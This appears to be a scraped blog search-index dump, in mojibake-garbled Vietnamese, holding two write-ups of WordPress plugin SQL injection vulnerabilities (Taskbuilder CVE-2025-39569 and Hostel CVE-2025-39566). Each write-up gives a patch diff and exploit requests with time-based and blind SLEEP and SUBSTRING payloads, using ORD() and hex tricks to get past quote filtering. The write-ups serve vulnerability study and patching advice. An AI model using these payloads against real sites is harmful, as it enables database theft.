dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress 